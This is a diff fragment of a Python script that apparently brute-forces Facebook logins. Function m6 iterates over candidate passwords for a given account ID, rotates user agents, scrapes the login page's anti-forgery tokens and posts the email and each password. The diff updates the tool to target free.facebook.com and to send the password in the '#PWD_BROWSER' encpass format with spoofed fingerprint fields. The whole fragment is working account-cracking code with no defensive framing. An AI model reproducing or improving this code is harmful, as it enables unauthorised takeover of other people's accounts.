@@ -1227,8 +1227,30 @@ def m6(idf,pwv):
   for ps in pwv:
    session = requests.Session()
    pro = random.choice(ugen)
-   free_fb = session.get(f'https://lm.facebook.com').text
-   log_data = {'m_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),'try_number': '0','unrecognized_tries': '0','email': idf,'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '','had_cp_prefilled': 'false','had_password_prefilled': 'false','is_smart_lock': 'true','bi_xrwh': '0','pass': ps,'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),'__dyn': '','__csr': '','__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),'__a': '','__user': '0','_fb_noscript': 'true'}
+   free_fb = session.get(f'https://free.facebook.com').text
+   log_data = {
+        "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1), 
+        "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1), 
+        "display": "",
+        "isprivate": "",
+        "return_session": "",
+        "skip_api_login": "",
+        "signed_next": "",
+        "trynum": "1",
+        "timezone": "420",
+        "lgndim": "eyJ3IjoxOTIwLCJoIjoxMDgwLCJhdyI6MTkyMCwiYWgiOjEwNDAsImMiOjI0fQ%3D%3D",
+        "lgnrnd": "033753_ik6I",
+        "lgnjs": "1714300673",
+        "email": idf,
+        "prefill_contact_point": "",
+        "prefill_source": "",
+        "prefill_type": "",
+        "first_prefill_source": "",
+        "first_prefill_type": "",
+        "had_cp_prefilled": "false",
+        "had_password_prefilled": "false",
+        "ab_test_data": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+        "encpass": "#PWD_BROWSER:0:{}:{}".format(re.search('name="m_ts" value="(.*?)"',str(free_fb)).group(1),ps),}
    header_freefb = {
     'authority': 'm.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
